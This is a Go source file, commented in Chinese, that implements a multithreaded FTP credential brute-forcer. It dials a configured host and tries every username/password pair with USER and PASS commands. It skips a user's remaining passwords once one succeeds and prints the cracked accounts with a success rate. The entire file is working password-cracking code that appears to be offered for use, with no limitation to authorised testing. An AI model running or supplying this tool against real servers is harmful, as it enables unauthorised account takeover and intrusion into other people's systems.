package ftp

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// CrackResult 破解结果
type CrackResult struct {
	Username string        // 用户名
	Password string        // 密码
	Success  bool          // 是否成功
	Duration time.Duration // 耗时
	Error    string        // 错误信息
}

// CrackWorker FTP破解工作器
type CrackWorker struct {
	config         *FTPConfig
	results        []CrackResult
	resultsMux     sync.Mutex
	wg             sync.WaitGroup
	progress       chan int
	successResults chan CrackResult
	channelsClosed bool // 标记通道是否已关闭
}

// NewCrackWorker 创建新的破解工作器
func NewCrackWorker(config *FTPConfig) *CrackWorker {
	return &CrackWorker{
		config:         config,
		results:        make([]CrackResult, 0),
		progress:       make(chan int, 100),
		successResults: make(chan CrackResult, 100),
	}
}

// safeSendSuccess 完全安全的成功结果发送方法
func safeSendSuccess(w *CrackWorker, successChan chan<- string, username string, result CrackResult) {
	// 使用recover机制来捕获任何可能的panic
	defer func() {
		if r := recover(); r != nil {
			// 忽略panic，不进行任何操作
		}
	}()

	// 检查通道是否已关闭
	if w.channelsClosed {
		return
	}

	// 使用非阻塞方式发送用户名到成功通道
	select {
	case successChan <- username:
		// 成功发送用户名到成功通道
	default:
		// 通道可能已满或已关闭，忽略发送
	}

	// 使用非阻塞方式发送完整结果到成功结果通道
	select {
	case w.successResults <- result:
		// 成功发送结果到成功结果通道
	default:
		// 通道可能已满或已关闭，忽略发送
	}
}

// safeProgressUpdate 完全安全的进度更新方法
func safeProgressUpdate(w *CrackWorker) {
	// 使用recover机制来捕获任何可能的panic
	defer func() {
		if r := recover(); r != nil {
			// 忽略panic，不进行任何操作
		}
	}()

	// 检查通道是否已关闭
	if w.channelsClosed {
		return
	}

	// 使用非阻塞方式发送进度更新
	select {
	case w.progress <- 1:
		// 成功发送进度更新
	default:
		// 通道可能已满或已关闭，忽略发送
	}
}

// connectFTP 连接到FTP服务器
func (w *CrackWorker) connectFTP() (net.Conn, error) {
	address := net.JoinHostPort(w.config.Host, fmt.Sprintf("%d", w.config.Port))
	conn, err := net.DialTimeout("tcp", address, time.Duration(w.config.Timeout)*time.Second)
	if err != nil {
		return nil, err
	}

	// 设置完整的超时
	timeout := time.Duration(w.config.Timeout) * time.Second
	conn.SetReadDeadline(time.Now().Add(timeout))
	conn.SetWriteDeadline(time.Now().Add(timeout))

	return conn, nil
}

// readFTPResponse 读取FTP服务器响应
func (w *CrackWorker) readFTPResponse(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	var responses []string

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return "", err
		}

		trimmedLine := strings.TrimSpace(line)
		responses = append(responses, trimmedLine)

		// 检查是否是完整响应
		// FTP响应格式：3位数字 + 空格/连字符 + 文本
		// 单行响应：3位数字 + 空格 + 文本
		// 多行响应：第一行3位数字 + 连字符 + 文本，最后一行3位数字 + 空格 + 文本
		if len(trimmedLine) >= 4 {
			// 检查是否是单行响应或多行响应的最后一行
			if trimmedLine[3] == ' ' {
				break
			}
		}
	}

	return strings.Join(responses, "\n"), nil
}

// sendFTPCommand 发送FTP命令并读取响应
func (w *CrackWorker) sendFTPCommand(conn net.Conn, command string) (string, error) {
	// 发送命令前重新设置超时
	timeout := time.Duration(w.config.Timeout) * time.Second
	conn.SetWriteDeadline(time.Now().Add(timeout))

	_, err := conn.Write([]byte(command + "\r\n"))
	if err != nil {
		return "", err
	}

	// 读取响应前重新设置超时
	conn.SetReadDeadline(time.Now().Add(timeout))

	return w.readFTPResponse(conn)
}

// authenticateFTP 认证FTP用户
func (w *CrackWorker) authenticateFTP(username, password string) (bool, time.Duration, error) {
	start := time.Now()

	// 连接到FTP服务器
	conn, err := w.connectFTP()
	if err != nil {
		return false, 0, err
	}
	defer conn.Close()

	// 读取欢迎消息前重新设置超时
	timeout := time.Duration(w.config.Timeout) * time.Second
	conn.SetReadDeadline(time.Now().Add(timeout))

	welcome, err := w.readFTPResponse(conn)
	if err != nil {
		return false, time.Since(start), err
	}

	// 检查欢迎消息是否以"220"开头（FTP服务就绪）
	if !strings.HasPrefix(welcome, "220") {
		return false, time.Since(start), fmt.Errorf("FTP服务不可用: %s", welcome)
	}

	// 发送USER命令
	userCmd := fmt.Sprintf("USER %s", username)
	userResponse, err := w.sendFTPCommand(conn, userCmd)
	if err != nil {
		return false, time.Since(start), err
	}

	// 提取响应码（前3位）
	var userCode string
	if len(userResponse) >= 3 {
		userCode = userResponse[:3]
	}

	// 检查用户响应
	switch userCode {
	case "230":
		// 匿名登录成功（不需要密码）
		return true, time.Since(start), nil
	case "331":
		// 需要密码，继续
	case "530":
		// 认证失败（用户不存在或密码错误）
		return false, time.Since(start), fmt.Errorf("认证失败: %s", userResponse)
	case "500", "501", "502":
		// 命令错误
		return false, time.Since(start), fmt.Errorf("命令错误: %s", userResponse)
	case "421":
		// 服务不可用
		return false, time.Since(start), fmt.Errorf("服务不可用: %s", userResponse)
	default:
		// 其他响应，检查是否以"3"开头（表示需要密码）
		if !strings.HasPrefix(userResponse, "3") {
			return false, time.Since(start), fmt.Errorf("用户认证失败: %s", userResponse)
		}
	}

	// 发送PASS命令
	passCmd := fmt.Sprintf("PASS %s", password)
	passResponse, err := w.sendFTPCommand(conn, passCmd)
	if err != nil {
		return false, time.Since(start), err
	}

	// 提取响应码（前3位）
	var passCode string
	if len(passResponse) >= 3 {
		passCode = passResponse[:3]
	}

	// 检查密码响应
	switch passCode {
	case "230":
		// 登录成功
		return true, time.Since(start), nil
	case "530":
		// 认证失败
		return false, time.Since(start), fmt.Errorf("认证失败: %s", passResponse)
	case "421":
		// 服务不可用
		return false, time.Since(start), fmt.Errorf("服务不可用: %s", passResponse)
	default:
		// 其他失败响应
		return false, time.Since(start), fmt.Errorf("密码错误: %s", passResponse)
	}
}

// worker 工作线程
func (w *CrackWorker) worker(jobs <-chan [2]string, successChan chan<- string, ctx context.Context) {
	defer w.wg.Done()

	for {
		select {
		case job, ok := <-jobs:
			if !ok {
				return
			}
			username, password := job[0], job[1]

			success, duration, err := w.authenticateFTP(username, password)

			result := CrackResult{
				Username: username,
				Password: password,
				Success:  success,
				Duration: duration,
			}

			if err != nil {
				result.Error = err.Error()
			}

			w.resultsMux.Lock()
			w.results = append(w.results, result)
			w.resultsMux.Unlock()

			// 如果破解成功，发送成功结果
			if success {
				// 使用完全安全的方法发送成功结果
				safeSendSuccess(w, successChan, username, result)
			}

			// 发送进度更新前检查上下文是否已取消
			select {
			case <-ctx.Done():
				// 上下文已取消，立即返回
				return
			default:
				// 发送进度更新
				safeProgressUpdate(w)
			}
		case <-ctx.Done():
			return
		}
	}
}

// Run 运行FTP破解
func (w *CrackWorker) Run() []CrackResult {
	// 创建工作队列和成功信号通道
	jobs := make(chan [2]string, 100)
	successChan := make(chan string, len(w.config.Username))

	// 创建上下文用于控制停止
	ctx, _ := context.WithCancel(context.Background())

	// 启动工作线程
	for i := 0; i < w.config.Threads; i++ {
		w.wg.Add(1)
		go w.worker(jobs, successChan, ctx)
	}

	// 按用户顺序破解：对每个用户按顺序尝试密码，一旦成功就跳过该用户的后续密码
	go func() {
		// 记录已成功的用户
		successUsers := make(map[string]bool)

		for _, username := range w.config.Username {
			// 如果该用户已经成功，跳过
			if successUsers[username] {
				continue
			}

			// 按顺序尝试该用户的密码
			for _, password := range w.config.Password {
				// 检查上下文是否已取消
				select {
				case <-ctx.Done():
					// 上下文被取消，停止分发任务
					close(jobs)
					return
				default:
					// 继续分发任务
				}

				// 检查是否有成功信号（非阻塞）
				select {
				case successUser := <-successChan:
					successUsers[successUser] = true
				default:
					// 没有成功信号，继续
				}

				// 如果该用户已经成功，跳过后续密码
				if successUsers[username] {
					break
				}

				jobs <- [2]string{username, password}
			}
		}
		close(jobs)
		close(successChan)
	}()

	// 等待所有工作完成
	w.wg.Wait()

	// 关闭进度通道，防止后续发送操作
	close(w.progress)
	close(w.successResults)
	w.channelsClosed = true

	return w.results
}

// GetProgress 获取进度通道
func (w *CrackWorker) GetProgress() <-chan int {
	return w.progress
}

// GetSuccessResults 获取成功结果通道
func (w *CrackWorker) GetSuccessResults() <-chan CrackResult {
	return w.successResults
}

// PrintResults 打印破解结果
func (w *CrackWorker) PrintResults() {
	successCount := 0
	totalAttempts := len(w.results)

	// 使用map去重，只保留第一个成功的结果
	uniqueResults := make(map[string]CrackResult)
	successResults := make([]CrackResult, 0)

	for _, result := range w.results {
		if result.Success {
			key := result.Username + "|" + result.Password
			if _, exists := uniqueResults[key]; !exists {
				uniqueResults[key] = result
				successResults = append(successResults, result)
				successCount++
			}
		}
	}

	// 确保之前的进度输出换行
	fmt.Println()

	fmt.Println("FTP破解完成！")
	fmt.Printf("总尝试次数: %d\n", totalAttempts)
	fmt.Printf("成功破解: %d\n", successCount)

	if totalAttempts > 0 {
		successRate := float64(successCount) / float64(totalAttempts) * 100
		fmt.Printf("成功率: %.2f%%\n", successRate)
	}

	if successCount > 0 {
		fmt.Println()
		fmt.Println("成功账户:")
		for _, result := range successResults {
			fmt.Printf("用户名: %s, 密码: %s, 耗时: %v\n",
				result.Username, result.Password, result.Duration)
		}
	}
}
